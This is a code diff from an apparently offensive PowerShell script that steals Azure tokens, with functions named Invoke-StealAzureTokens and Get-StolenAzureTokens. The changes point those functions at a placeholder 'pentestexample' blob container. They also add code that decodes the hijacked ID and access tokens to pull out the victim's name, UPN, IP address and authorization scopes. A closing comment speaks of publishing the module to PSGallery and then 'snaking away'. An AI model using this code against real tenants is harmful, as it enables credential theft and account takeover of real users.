@@ -71,7 +71,7 @@ function Invoke-StealAzureTokens {
     }
 }
 
-Invoke-StealAzureTokens -ContainerUri 'https://pentest.blob.core.windows.net/test' -SasToken 'sv=2022....'
+Invoke-StealAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11..
 
 <#
     .SYNOPSIS
@@ -104,7 +104,7 @@ function Get-StolenAzureTokens {
 
 }
 
-$HiJackedTokens = Get-StolenAzureTokens -ContainerUri 'https://pentest.blob.core.windows.net/test' -SasToken 'sv=2022...'
+$HiJackedTokens = Get-StolenAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11..
 
 <#
     .SYNOPSIS
@@ -138,6 +138,35 @@ function Update-StolenAzureTokens {
     
 }
 $HiJackedTokens = Update-StolenAzureTokens
+
+#Now lets take a look at the ID & Access tokens base64 decoded JSON converted payload :)
+
+$DecodedAuthN = [System.Text.Encoding]::UTF8.GetString(`
+        [Convert]::FromBase64String($HiJackedTokens.id_token.Split('.')[1])) | ConvertFrom-Json
+
+$DecodedAuthZ = [System.Text.Encoding]::UTF8.GetString(`
+        [Convert]::FromBase64String($HiJackedTokens.access_token.Split('.')[1])) | ConvertFrom-Json
+
+$IDTokenClaims = [PSCustomObject]@{
+    IDTokenAudience = $DecodedAuthN.aud
+    IDTokenExpiry   = [DateTime]::UnixEpoch.AddSeconds([string]$DecodedAuthN.exp.ToString())
+    AuthMethod      = $DecodedAuthN.amr
+    LastName        = $DecodedAuthN.family_name
+    FirstName       = $DecodedAuthN.given_name
+    IP              = $DecodedAuthN.ipaddr
+    UPN             = $DecodedAuthN.upn
+}
+
+$AccessTokenClaims = [PSCustomObject]@{
+    AuthZScopes       = $DecodedAuthZ.scp
+    AccessTokenExpiry = [DateTime]::UnixEpoch.AddSeconds([string]$DecodedAuthZ.exp.ToString())
+    UPN               = $DecodedAuthZ.upn
+    Audience          = $DecodedAuthZ.aud
+    Issuer            = $DecodedAuthZ.iss
+  
+}
+
+return $AccessTokenClaims, $IDTokenClaims
 
 
 #Import and Install my Authored Module from PSGallery and then snake away. :)
